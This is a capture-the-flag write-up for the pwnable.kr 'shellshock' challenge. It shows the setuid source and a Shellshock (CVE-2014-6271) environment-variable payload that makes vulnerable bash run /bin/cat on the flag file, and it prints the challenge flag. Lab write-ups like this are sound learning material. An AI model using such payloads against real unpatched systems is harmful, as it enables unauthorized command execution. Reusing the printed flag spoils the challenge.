#Objective:
Mommy, there was a shocking news about bash.
I bet you already know, but lets just make it sure :)


ssh shellshock@pwnable.kr -p2222 (pw:guest)

This is a challenge from pwnables.kr worth 1 pt.

#Solution:

So first let’s ssh into the server, 

```
ssh shellshock@pwnable.kr -p2222
```

and see what we have...

Looking at the files we have “bash”, “flag”, “shellshock”, and “shellshock.c”. Just a guess but shellshock will probably be the binary we are going to pwn, shellshock.c is the source code for that binary, bash is a vulnerable version of bash that we will be exploiting, and flag is where the flag is going to be stored, Let’s take a look at shellshock.c (I’ve also attached it as a file for your convenience).

```
#include <stdio.h>
int main(){
    setresuid(getegid(), getegid(), getegid());
    setresgid(getegid(), getegid(), getegid());
    system("/home/shellshock/bash -c 'echo shock_me'");
    return 0;
}
```

Ok so looking at the code, what it does is it changes the permissions of the user, then executes the bash that we found earlier (probably vulnerable), and says “shock_me”. This is when we will use shellshock to cat the flag file. Firstly how shellshock works is you send code in the form of an environmental variable to a remote server, and when that server reads it as an environmental variable, a bug in bash will execute it. The string below will create a new environmental variable that will just cat the file we need, and also export it. After we do that we should be able to just run the program and that should trigger the vulnerable version of bash thus giving us the flag.

First create and export the environment variable
```
“export x=”() { :; }; /bin/cat flag””
```

Now run the vulnerable version of bash
```
./shellshock
```

Then it prints out the flag. Also CVE-2014-6271 is the official name for the shellshock vulnerability.


Flag: “only if I knew CVE-2014-6271 ten years ago..!!





